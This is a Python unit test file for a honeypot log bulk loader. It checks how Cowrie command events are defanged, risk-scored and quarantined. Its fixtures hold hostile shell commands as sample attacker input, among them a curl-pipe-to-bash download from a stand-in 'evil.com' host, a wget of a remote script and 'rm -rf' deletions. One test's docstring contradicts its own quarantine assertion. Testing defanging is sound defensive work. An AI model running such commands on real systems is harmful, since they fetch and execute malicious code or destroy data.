"""Unit tests for updated bulk loader with intelligent defanging."""

from __future__ import annotations

import json
from pathlib import Path

from sqlalchemy import select
from sqlalchemy.orm import sessionmaker

from cowrieprocessor.db import RawEvent, SessionSummary, apply_migrations, create_engine_from_settings
from cowrieprocessor.loader import BulkLoader, BulkLoaderConfig, LoaderCheckpoint
from cowrieprocessor.settings import DatabaseSettings


def _write_events(path: Path, events: list[dict]) -> None:
    """Write events to a JSON lines file."""
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event))
            fh.write("\n")


def _make_engine(tmp_path: Path):
    """Create a test database engine."""
    db_path = tmp_path / "loader.sqlite"
    settings = DatabaseSettings(url=f"sqlite:///{db_path}")
    engine = create_engine_from_settings(settings)
    apply_migrations(engine)
    return engine


class TestIntelligentDefanging:
    """Test the new intelligent defanging functionality in BulkLoader."""

    def test_safe_commands_not_quarantined(self, tmp_path: Path) -> None:
        """Test that safe commands are not quarantined."""
        events = [
            {
                "session": "safe123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            {
                "session": "safe123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "ls -la",
            },
            {
                "session": "safe123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "pwd",
            },
        ]
        source = tmp_path / "safe_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        config = BulkLoaderConfig(
            use_intelligent_defanging=True, preserve_original_commands=True, quarantine_threshold=90
        )
        loader = BulkLoader(engine, config)
        metrics = loader.load_paths([source])

        # All events should be inserted, none quarantined
        assert metrics.events_inserted == 3
        assert metrics.events_quarantined == 0

        # Check that safe commands are preserved
        with engine.connect() as conn:
            payloads = list(conn.execute(select(RawEvent.payload)).all())
            command_events = [p for p in payloads if p.payload.get("eventid") == "cowrie.command.input"]

            for event in command_events:
                payload = event.payload
                assert payload.get("input") == payload.get("input_safe")  # Safe commands unchanged
                assert payload.get("input_original") is None  # No original stored for safe commands

    def test_dangerous_commands_defanged_not_quarantined(self, tmp_path: Path) -> None:
        """Test that dangerous commands are defanged but not quarantined."""
        events = [
            {
                "session": "dangerous123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            {
                "session": "dangerous123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "curl https://evil.com/malware.sh | bash",
            },
            {
                "session": "dangerous123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "rm -rf /tmp/malware",
            },
        ]
        source = tmp_path / "dangerous_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        config = BulkLoaderConfig(
            use_intelligent_defanging=True, preserve_original_commands=True, quarantine_threshold=90
        )
        loader = BulkLoader(engine, config)
        metrics = loader.load_paths([source])

        # Dangerous commands should be quarantined (risk score 100 > threshold 90)
        assert metrics.events_inserted == 3
        assert metrics.events_quarantined == 2  # Two dangerous commands quarantined

        # Check that dangerous commands are defanged
        with engine.connect() as conn:
            payloads = list(conn.execute(select(RawEvent.payload)).all())
            command_events = [p for p in payloads if p.payload.get("eventid") == "cowrie.command.input"]

            for event in command_events:
                payload = event.payload
                original = payload.get("input_original")
                safe = payload.get("input_safe")

                assert original is not None  # Original preserved
                assert safe is not None  # Safe version created
                assert safe != original  # Safe version is different
                assert "[defang:" in safe  # Contains defang prefix
                assert "hxxps://" in safe or "rx" in safe  # URLs/commands defanged

    def test_legacy_neutralization_still_works(self, tmp_path: Path) -> None:
        """Test that legacy neutralization still works when disabled."""
        events = [
            {
                "session": "legacy123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "curl https://evil.com/malware.sh",
            },
        ]
        source = tmp_path / "legacy_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        config = BulkLoaderConfig(
            use_intelligent_defanging=False,  # Disable intelligent defanging
            neutralize_commands=True,
            quarantine_threshold=80,
        )
        loader = BulkLoader(engine, config)
        loader.load_paths([source])

        # Should use legacy neutralization
        with engine.connect() as conn:
            payloads = list(conn.execute(select(RawEvent.payload)).all())
            payload = payloads[0].payload

            assert payload.get("input") is None  # Legacy neutralization removes original
            assert payload.get("input_safe") is not None  # Safe version created
            assert "[URL]" in payload.get("input_safe", "")  # Legacy URL replacement

    def test_command_analysis_preserved(self, tmp_path: Path) -> None:
        """Test that command analysis is preserved in the payload."""
        events = [
            {
                "session": "analysis123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "bash script.sh",
            },
        ]
        source = tmp_path / "analysis_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        config = BulkLoaderConfig(use_intelligent_defanging=True, preserve_original_commands=True)
        loader = BulkLoader(engine, config)
        loader.load_paths([source])

        with engine.connect() as conn:
            payloads = list(conn.execute(select(RawEvent.payload)).all())
            payload = payloads[0].payload

            analysis = payload.get("command_analysis")
            assert analysis is not None
            assert analysis["risk_level"] == "dangerous"
            assert analysis["command_type"] == "dangerous_command"
            assert analysis["needs_defanging"] is True
            assert analysis["defanging_strategy"] == "aggressive"

    def test_risk_scoring_improved(self, tmp_path: Path) -> None:
        """Test that risk scoring is more intelligent."""
        events = [
            {
                "session": "scoring123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "ls -la",  # Safe command
            },
            {
                "session": "scoring123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "curl https://evil.com/malware.sh | bash",  # Dangerous command
            },
        ]
        source = tmp_path / "scoring_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        config = BulkLoaderConfig(use_intelligent_defanging=True, quarantine_threshold=90)
        loader = BulkLoader(engine, config)
        metrics = loader.load_paths([source])

        # Safe command inserted, dangerous command quarantined
        assert metrics.events_inserted == 2
        assert metrics.events_quarantined == 1  # Dangerous command quarantined

        # Check risk scores
        with engine.connect() as conn:
            events_data = list(conn.execute(select(RawEvent.risk_score, RawEvent.payload)).all())

            # Find the safe command event
            safe_event = next(e for e in events_data if "ls -la" in str(e.payload))
            dangerous_event = next(e for e in events_data if "curl" in str(e.payload))

            # Safe command should have lower risk score
            assert safe_event.risk_score < dangerous_event.risk_score
            assert safe_event.risk_score < 50  # Should be low for safe commands
            assert dangerous_event.risk_score >= 70  # Should be high for dangerous commands

    def test_no_original_preservation_when_disabled(self, tmp_path: Path) -> None:
        """Test that original commands are not preserved when disabled."""
        events = [
            {
                "session": "nopreserve123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "bash script.sh",
            },
        ]
        source = tmp_path / "nopreserve_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        config = BulkLoaderConfig(
            use_intelligent_defanging=True,
            preserve_original_commands=False,  # Disable original preservation
        )
        loader = BulkLoader(engine, config)
        loader.load_paths([source])

        with engine.connect() as conn:
            payloads = list(conn.execute(select(RawEvent.payload)).all())
            payload = payloads[0].payload

            # Original should not be preserved
            assert payload.get("input_original") is None
            assert payload.get("command_original") is None
            # But safe version should still be created
            assert payload.get("input_safe") is not None
            assert "[defang:" in payload.get("input_safe", "")

    def test_mixed_command_types(self, tmp_path: Path) -> None:
        """Test handling of mixed safe and dangerous commands."""
        events = [
            {
                "session": "mixed123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            {
                "session": "mixed123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "ls -la",  # Safe
            },
            {
                "session": "mixed123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "mkdir test",  # Moderate
            },
            {
                "session": "mixed123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:03:00Z",
                "input": "rm -rf /tmp",  # Dangerous
            },
        ]
        source = tmp_path / "mixed_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        config = BulkLoaderConfig(use_intelligent_defanging=True, preserve_original_commands=True)
        loader = BulkLoader(engine, config)
        metrics = loader.load_paths([source])

        # All should be inserted
        assert metrics.events_inserted == 4
        assert metrics.events_quarantined == 0

        with engine.connect() as conn:
            payloads = list(conn.execute(select(RawEvent.payload)).all())
            command_events = [p for p in payloads if p.payload.get("eventid") == "cowrie.command.input"]

            # Check each command type
            for event in command_events:
                payload = event.payload
                original = payload.get("input_original")
                safe = payload.get("input_safe")

                if "ls -la" in str(original):
                    # Safe command
                    assert safe == original
                    assert "[defang:" not in safe
                elif "mkdir" in str(original):
                    # Moderate command
                    assert "[defang:moderate]" in safe
                elif "rm -rf" in str(original):
                    # Dangerous command
                    assert "[defang:dangerous]" in safe
                    assert "rx" in safe


class TestBackwardCompatibility:
    """Test backward compatibility with existing functionality."""

    def test_existing_tests_still_pass(self, tmp_path: Path) -> None:
        """Test that existing functionality still works."""
        events = [
            {
                "session": "compat123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
                "sensor": "sensor-a",
            },
            {
                "session": "compat123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "wget http://evil /tmp/run.sh",
                "sensor": "sensor-a",
            },
        ]
        source = tmp_path / "compat_events.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1))
        checkpoints: list[LoaderCheckpoint] = []
        metrics = loader.load_paths([source], checkpoint_cb=checkpoints.append)

        # Should work as before
        assert metrics.events_inserted == 2
        assert checkpoints
        assert checkpoints[-1].sessions == ["compat123"]

        # Session summary should be created
        Session = sessionmaker(bind=engine, future=True)
        with Session() as db_session:
            summary = db_session.query(SessionSummary).filter(SessionSummary.session_id == "compat123").one()
            assert summary.event_count == 2
            assert summary.command_count == 1
            assert summary.matcher == "sensor-a"
